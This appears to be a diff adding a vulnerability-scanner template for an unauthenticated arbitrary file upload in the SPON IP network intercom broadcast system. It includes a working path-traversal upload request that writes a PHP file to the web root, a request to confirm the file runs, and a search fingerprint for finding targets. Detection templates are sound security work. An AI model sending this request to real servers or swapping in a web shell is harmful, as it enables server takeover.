@@ -1,0 +1,33 @@
+http:
+    - raw:
+        - |
+          POST /php/videobacktrackpush.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+
+          jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=r_c_e.php&jsondata[videocontent]=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "24642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /r_c_e.php HTTP/1.1
+          Host: {{Hostname}}
+id: SPON-IP-videobacktrackpush_php-File-upload
+info:
+    author: Superhero
+    description: |-
+        fofa: body="vendors/toastr-master/build/toastr.min.js"
+        世邦通信SPON-IP网络对讲广播系统 videobacktrackpush.php 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+    name: 世邦通信SPON-IP网络对讲广播系统 videobacktrackpush.php 任意文件上传漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/vFQVqG7gFMWSzb9d6VOzIw
+    severity: high
+    tags: []
